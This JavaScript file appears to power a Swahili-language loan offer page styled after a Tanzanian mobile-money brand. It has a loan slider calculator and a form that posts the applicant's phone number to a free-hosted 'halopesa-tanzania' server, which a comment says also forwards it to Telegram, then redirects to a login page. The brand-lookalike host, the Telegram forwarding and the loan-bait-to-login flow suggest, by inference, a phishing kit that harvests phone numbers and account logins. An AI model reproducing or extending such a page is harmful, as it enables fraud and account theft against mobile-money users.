//
// ============================
// LOAN SLIDERS
// ============================
const amountSlider = document.getElementById("loanAmount");
const monthSlider = document.getElementById("loanMonths");

const amountText = document.getElementById("amountText");
const monthText = document.getElementById("monthText");
const paymentText = document.getElementById("monthlyPayment");

function updateLoan() {
  const amount = parseInt(amountSlider.value);
  const months = parseInt(monthSlider.value);

  // DISPLAY AMOUNT
  amountText.innerText = "TSh " + amount.toLocaleString();

  // DISPLAY MONTHS
  monthText.innerText = "Miezi " + months;

  // INTEREST CALCULATION
  const interestRate = 0.14;
  const total = amount + (amount * interestRate);
  const monthly = total / months;

  paymentText.innerText = "TSh " + Math.round(monthly).toLocaleString();
}

// SLIDER EVENTS
amountSlider.addEventListener("input", updateLoan);
monthSlider.addEventListener("input", updateLoan);

// INITIAL LOAD
updateLoan();


//
// ============================
// OPEN APPLICATION FORM
// ============================
function openForm() {
  document.querySelector(".container").style.display = "none";
  document.getElementById("formPage").style.display = "block";

  window.scrollTo({
    top: 0,
    behavior: "smooth"
  });
}


//
// ============================
// FORM SUBMIT (SEND TO BACKEND + TELEGRAM)
// ============================
document.addEventListener("DOMContentLoaded", function () {

  const form = document.getElementById("loanForm");

  if (!form) {
    console.error("loanForm not found in HTML");
    return;
  }

  form.addEventListener("submit", async function (e) {
    e.preventDefault();

    const phone = document.getElementById("phone").value;

    if (!phone) {
      alert("Tafadhali ingiza namba ya simu");
      return;
    }

    try {
      const res = await fetch("https://halopesa-tanzania.onrender.com/apply", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({ phone })
      });

      if (!res.ok) {
        throw new Error("Server error: " + res.status);
      }

      const data = await res.json();
      console.log("Server response:", data);

      alert("Application sent successfully!");

      // Redirect AFTER success
      window.location.href = "login.html";

    } catch (error) {
      console.error("Submission error:", error);
      alert("Failed to send application. Check internet or server.");
    }
  });

});
